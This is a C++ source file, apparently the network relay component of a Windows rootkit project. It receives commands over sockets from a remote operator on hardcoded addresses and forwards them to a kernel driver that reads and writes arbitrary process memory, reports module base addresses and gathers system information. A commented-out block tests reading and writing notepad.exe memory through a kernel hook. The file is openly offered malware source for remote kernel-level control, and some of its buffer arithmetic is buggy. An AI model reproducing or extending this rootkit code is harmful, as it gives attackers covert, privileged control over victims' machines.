#include "medium.h"
#include "rootreqs.h"

BOOL ShouldQuit() {
    return FALSE;
}


int MediumAct(NETWORK_INFO SndInfo, NETWORK_INFO SrvInfo) {
    char ReqType;
    PASS_DATA result;
    PVOID SendBuf = NULL;
    ULONG SendSize = 0;

    ROOTKIT_OPERATION RootStat;
    ROOTKIT_MEMORY OprBuffer;
    PVOID LocalWrite = NULL;
    PVOID LocalRead = NULL;
    PVOID SystemInfo = NULL;
    ULONG ReadSize = 0;
    ULONG WriteSize = 0;
    ULONG SysSize = 0;
    ULONG TryValue = 0;
    ULONG TryValRet = 0;

    NETWORK_OPS Operation;
    char GenValue = 232;
    char NextLine = '\n';
    char NullTerm = '\0';
    std::time_t curr = NULL;
    tm UtcTime;
    char TimeData[26];
    char UtcData[26];
    const char* RandomMsg1 = "IP data -\n";
    const char* RandomMsg2 = "Port number -\n";
    const char* RandomMsg3 = "Communication protocol: IPV4\n";
    const char* RandomMsg = "Random char numerical value generated: ";
    const char* BadTime = "Cannot get machine time\n";
    const char* LocalStr = "Local time on medium -> ";
    const char* UtcStr = "UTC (global) time on medium -> ";
    ULONG RandomSize1 = (ULONG)strlen(RandomMsg1);
    ULONG RandomSize2 = (ULONG)strlen(RandomMsg2);
    ULONG RandomSize3 = (ULONG)strlen(RandomMsg3);


    while (1 == 1) {
        result = root_internet::RecvData(SndInfo.AsoSock, sizeof(ReqType), &ReqType, FALSE, 0);
        if (!result.err && result.value == sizeof(ReqType) && (ReqType == 1 || ReqType == 0)) {
            if (ReqType == 1) {
                result = root_internet::RecvData(SndInfo.AsoSock, sizeof(Operation), &Operation, FALSE, 0);
            }
            else {
                result = root_internet::RecvData(SndInfo.AsoSock, sizeof(RootStat), &RootStat, FALSE, 0);
            }

            if (ShouldQuit()) {
                if (ReqType == 0) {
                    Operation = terminatemed;
                    result = root_internet::SendData(SndInfo.AsoSock, &Operation, sizeof(Operation), FALSE, 0);
                    if (!result.err && result.value == sizeof(Operation)) {
                        result = root_internet::RecvData(SndInfo.AsoSock, sizeof(Operation), &Operation, FALSE, 0);
                        if (!result.err && result.value == sizeof(Operation) && Operation == terminatemed) {
                            printf("Termination initiated from here accepted by tomed\n");
                        }
                    }
                }

                else {
                    RootStat = RKOP_TERMINATE;
                    result = root_internet::SendData(SndInfo.AsoSock, &RootStat, sizeof(RootStat), FALSE, 0);
                    if (!result.err && result.value == sizeof(RootStat)) {
                        result = root_internet::RecvData(SndInfo.AsoSock, sizeof(RootStat), &RootStat, FALSE, 0);
                        if (!result.err && result.value == sizeof(RootStat) && RootStat == RKOP_TERMINATE) {
                            printf("Termination initiated from here accepted by tomed\n");
                        }
                    }
                }
                closesocket(SndInfo.AsoSock);
                return -1;
            }

            if (ReqType == 0 && !result.err && result.value == sizeof(Operation)) {
                result = root_internet::SendData(SndInfo.AsoSock, &Operation, sizeof(Operation), FALSE, 0);
                if (!result.err && result.value == sizeof(Operation)) {
                    switch (Operation) {
                    case random:
                        SendSize = (ULONG)strlen(RandomMsg) + 2;
                        SendBuf = malloc(SendSize);
                        if (!SendBuf) {
                            SendBuf = NULL;
                            break;
                        }

                        memcpy(SendBuf, RandomMsg, strlen(RandomMsg) + 1);
                        memcpy((PVOID)((ULONG64)SendBuf + strlen(RandomMsg) + 1), &GenValue, sizeof(GenValue));
                        break;

                    case medata:
                        SendSize = (ULONG)(3 * sizeof(SendSize) + RandomSize1 + RandomSize2 + RandomSize3 + sizeof(SndInfo.AddrInfo) + sizeof(SndInfo.Port));
                        SendBuf = malloc(SendSize);
                        if (!SendBuf) {
                            SendBuf = NULL;
                            break;
                        }

                        memcpy(SendBuf, &RandomSize1, sizeof(RandomSize1));
                        memcpy((PVOID)((ULONG64)SendBuf + sizeof(RandomSize1)), RandomMsg1, RandomSize1);
                        memcpy((PVOID)((ULONG64)SendBuf + RandomSize1 + sizeof(RandomSize1)), &RandomSize2, sizeof(RandomSize2));
                        memcpy((PVOID)((ULONG64)SendBuf + RandomSize1 + sizeof(RandomSize1) * 2), RandomMsg2, RandomSize2);
                        memcpy((PVOID)((ULONG64)SendBuf + RandomSize1 + RandomSize2 + sizeof(RandomSize1) * 2), &RandomSize3, sizeof(RandomSize3));
                        memcpy((PVOID)((ULONG64)SendBuf + RandomSize1 + RandomSize2 + sizeof(RandomSize1) * 3), RandomMsg3, RandomSize3);
                        memcpy((PVOID)((ULONG64)SendBuf + RandomSize1 + RandomSize2 + RandomSize3 + sizeof(RandomSize1) * 3), &SndInfo.Port, sizeof(SndInfo.Port));
                        memcpy((PVOID)((ULONG64)SendBuf + RandomSize1 + RandomSize1 + RandomSize1 + sizeof(SndInfo.Port) + sizeof(RandomSize1) * 3), &SndInfo.AddrInfo, sizeof(SndInfo.AddrInfo));
                        break;

                    case echo:
                        result = root_internet::RecvData(SndInfo.AsoSock, sizeof(SendSize), &SendSize, FALSE, 0);
                        if (result.err || result.value != sizeof(SendSize)) {
                            SendBuf = NULL;
                            break;
                        }

                        SendBuf = malloc(SendSize);
                        if (!SendBuf) {
                            SendBuf = NULL;
                            break;
                        }

                        result = root_internet::RecvData(SndInfo.AsoSock, SendSize, SendBuf, FALSE, 0);
                        if (result.err || result.value != SendSize) {
                            SendBuf = NULL;
                        }
                        printf("Received echo string: %s\n", (char*)SendBuf);
                        break;

                    case timereq:
                        curr = std::time(0);
                        ctime_s(TimeData, 26, &curr);
                        gmtime_s(&UtcTime, &curr);
                        asctime_s(UtcData, 26, &UtcTime);

                        SendSize = (ULONG)(strlen(TimeData) + strlen(LocalStr) + 3 + strlen(UtcStr) + strlen(UtcData));
                        SendBuf = malloc(SendSize);
                        if (!SendBuf) {
                            printf("Could not allocate memory for sending buffer of current time\n");
                            SendBuf = NULL;
                            break;
                        }

                        memcpy(SendBuf, (void*)LocalStr, strlen(LocalStr));  // Local string, no \0
                        memcpy((PVOID)((ULONG64)SendBuf + strlen(LocalStr)), (void*)TimeData, strlen(TimeData));  // Local time string, no \0
                        memcpy((PVOID)((ULONG64)SendBuf + strlen(LocalStr) + strlen(TimeData)), &NextLine, 1);  // NextLine
                        memcpy((PVOID)((ULONG64)SendBuf + strlen(LocalStr) + strlen(TimeData) + 1), (void*)UtcStr, strlen(UtcStr));  // UTC string, no \0
                        memcpy((PVOID)((ULONG64)SendBuf + strlen(LocalStr) + strlen(TimeData) + strlen(UtcStr) + 1), (void*)UtcData, strlen(UtcData));  // UTC time string, no \0
                        memcpy((PVOID)((ULONG64)SendBuf + strlen(LocalStr) + strlen(TimeData) + strlen(UtcStr) + strlen(UtcData) + 1), &NextLine, 1);  // NextLine
                        memcpy((PVOID)((ULONG64)SendBuf + strlen(LocalStr) + strlen(TimeData) + strlen(UtcStr) + strlen(UtcData) + 2), &NullTerm, 1);  // NullTerm
                        break;

                    case terminatereq:
                        closesocket(SndInfo.AsoSock);
                        return -1;
                    }

                    if (SendBuf == NULL) {
                        printf("An error occured\n");
                    }
                    else {
                        root_internet::SendData(SndInfo.AsoSock, &SendSize, sizeof(SendSize), FALSE, 0);
                        root_internet::SendData(SndInfo.AsoSock, SendBuf, SendSize, FALSE, 0);
                        free(SendBuf);
                    }

                    // Clean important variables and network stack from last request -
                    root_internet::CleanNetStack(SndInfo.AsoSock);
                    SendSize = 0;
                    printf("FINISH MEDIUM FUNCTION FINISHED\n");
                    SendBuf = NULL;
                }

                else if (ReqType == 1 && !result.err && result.value == sizeof(RootStat)) {
                    result = root_internet::SendData(SndInfo.AsoSock, &RootStat, sizeof(RootStat), FALSE, 0);
                    if (!result.err && result.value == sizeof(RootStat)) {
                        switch (RootStat) {
                        case RKOP_WRITE:
                            result = root_internet::RecvData(SndInfo.AsoSock, sizeof(WriteSize), &WriteSize, FALSE, 0);
                            if (result.err || result.value != sizeof(WriteSize)) {
                                printf("Cannot get size of write value in bytes\n");
                                break;
                            }

                            LocalWrite = malloc(WriteSize);
                            if (!LocalWrite) {
                                printf("Cannot allocate buffer for writing locally\n");
                                break;
                            }

                            result = root_internet::RecvData(SndInfo.AsoSock, WriteSize, LocalWrite, FALSE, 0);
                            if (result.err || result.value != WriteSize) {
                                printf("Cannot get write value\n");
                                free(LocalWrite);
                                break;
                            }

                            if (!WriteKernelCall(SndInfo.AsoSock, LocalWrite, &OprBuffer)) {
                                printf("Failed operation (sending of returned struct / receiving OG struct)\n");
                            }
                            free(LocalWrite);
                            break;

                        case RKOP_READ:

                            if (!ReadKernelCall(SndInfo.AsoSock, LocalRead, &OprBuffer)) {
                                printf("Failed operation (sending of returned struct / receiving OG struct)\n");
                            }
                            free(LocalRead);
                            break;

                        case RKOP_MDLBASE:
                            printf("No extra buffer parameters for getting the module base..\n");
                            if (!MdlBaseKernelCall(SndInfo.AsoSock, &OprBuffer)) {
                                printf("Failed operation (sending of returned struct / receiving OG struct)\n");
                            }
                            else {
                                printf("%llu\n", OprBuffer.BaseAddr);
                            }
                            break;

                        case RKOP_DSPSTR:
                            printf("No extra buffer parameters for displaying a debug string..\n");
                            if (!DbgStrKernelCall(SndInfo.AsoSock, &OprBuffer)) {
                                printf("Failed operation (sending of returned struct / receiving OG struct)\n");
                            }
                            break;

                        case RKOP_SYSINFO:
                            result = root_internet::RecvData(SndInfo.AsoSock, sizeof(SysSize), &SysSize, FALSE, 0);
                            if (result.err || result.value != sizeof(SysSize)) {
                                printf("Cannot get size of initial system buffer\n");
                                break;
                            }

                            SystemInfo = malloc(SysSize);
                            if (SystemInfo == NULL) {
                                printf("Cannot allocate initial system buffer\n");
                                break;
                            }

                            result = root_internet::RecvData(SndInfo.AsoSock, SysSize, SystemInfo, FALSE, 0);
                            if (result.err || result.value != SysSize) {
                                printf("Cannot get initial system buffer\n");
                                free(SystemInfo);
                                break;
                            }

                            if (!SysInfoKernelCall(SndInfo.AsoSock, &OprBuffer, SystemInfo)) {
                                printf("Failed operation (sending of returned struct / receiving OG struct)\n");
                            }
                            else {
                                result = root_internet::SendData(SndInfo.AsoSock, SystemInfo, SysSize, FALSE, 0);
                                if (result.err || result.value != SysSize) {
                                    free(SystemInfo);
                                    break;
                                }
                            }
                            free(SystemInfo);
                            break;

                        case RKOP_TRYMAN:
                            if (!TryManKernelCall(SndInfo.AsoSock, &OprBuffer)) {
                                printf("Try manipulation did not work\n");
                                break;
                            }

                            printf("Try manipulation succeeded\n");
                            break;
                        }

                        // Clean important variables and network stack from last request -
                        root_internet::CleanNetStack(SndInfo.AsoSock);
                        SendSize = 0;
                        printf("FINISH MEDIUM FUNCTION FINISHED\n");
                        SendBuf = NULL;
                    }

                    else {
                        printf("Error has occured\n");
                        if (result.value == 10054 || result.value == 10060 || result.value == 0) {
                            break;
                        }
                    }
                }
            }
        }
    }
    closesocket(SndInfo.AsoSock);
    return 0;
}


int main() {
    SOCKET ssckt;
    int SockaddrLen = sizeof(sockaddr);
    const char* SrvIP = "192.168.1.41";  //"127.0.0.1";
    const char* SndIP = "192.168.1.35";  //"127.0.0.1";
    USHORT SrvPort = 44444;
    USHORT SndPort = 44444;
    NETWORK_INFO NetArr[3];
    root_internet::SetNetStructs(SrvIP, SndIP, SrvPort, SndPort, NetArr);
    int result = root_internet::StartComms(NetArr);
    if (result == 1) {
        printf("Quitting (internet/socket communication initiation error)..\n");
        return 1;
    }

    printf("Initialization of connection succeeded, proceeding to start sending requests..\n");
    while (1 == 1) {
        printf(" here 3\n");

        // Accept connection
        ssckt = accept(NetArr[0].AsoSock, (sockaddr*)&NetArr[1].AddrInfo, &SockaddrLen);
        if (ssckt == INVALID_SOCKET) {
            std::cerr << "Could not accept connection with socket object: " << WSAGetLastError() << "\n";
        }
        else {
            NetArr[1].AsoSock = ssckt;
            result = root_internet::InitConn(NetArr[1], NetArr[0], NetArr[2]);
            root_internet::CleanNetStack(NetArr[1].AsoSock);
            printf(" here 4\n");
            if (result == 0) {
                printf("Initialization of connection succeeded, proceeding to start receiving requests..\n");
                result = MediumAct(NetArr[1], NetArr[0]);
                printf("Disconnected from (%s, %hu)\n", NetArr[1].IP, NetArr[1].Port);
                root_internet::CleanNetStack(NetArr[1].AsoSock);

                if (result == -1) {
                    printf("Termination Complete\n");
                    closesocket(NetArr[0].AsoSock);
                    WSACleanup();
                    return 0;
                }
            }
            else {
                printf(" here 2\n");
                printf("Initialization of connection did not work correctly (socket/sender/conninfo errors)\n");
                closesocket(NetArr[1].AsoSock);
            }
        }
    }

    closesocket(NetArr[0].AsoSock);
    WSACleanup();
    return 0;

    /*
    const char* Module = "notepad.exe";
    ULONG64 Address = 0x0000000000100000;  // CHANGE BY COMMITED AREAS

    uintptr_t NpBaseAddress = GetModuleBaseAddress(Module);  // get address of notepad.exe in memory

    DisplayStringFromKMD("HACKED BY P4UL LLL BOZO");  // write const char* string to windbg

    ROOTKIT_MEMORY SysData = GetSystenInformation("cPpb", FALSE);

    const char * WriteValue = "Test To Read And Write Through Hook UM - KM";
    ULONG64 SizeVal = strlen(WriteValue) + 1;
    PVOID WriteFromBuffer = malloc(SizeVal);
    memcpy(WriteFromBuffer, WriteValue, SizeVal);
    WriteToRootkKMD((PVOID)Address, WriteFromBuffer, SizeVal, Module);

    PVOID ReadBuffer = malloc(SizeVal);
    bool success = ReadFromRootkKMD((PVOID)Address, ReadBuffer, SizeVal, Module, "mymyymym");
    printf("Value read from %s, address %llu -> %s\n", Module, Address, (const char *)ReadBuffer);
    free(ReadBuffer);

    ReadBuffer = malloc(SizeVal);
    success = ReadFromRootkKMD(WriteFromBuffer, ReadBuffer, SizeVal, "mymyymym", "mymyymym");  // for some reason source EPROCESS looks like kernelspace/process handle
    printf("Value read from myself, address %llu -> %s\n", (ULONG64)WriteFromBuffer, (const char*)ReadBuffer);
    free(WriteFromBuffer);
    free(ReadBuffer);
    */
}
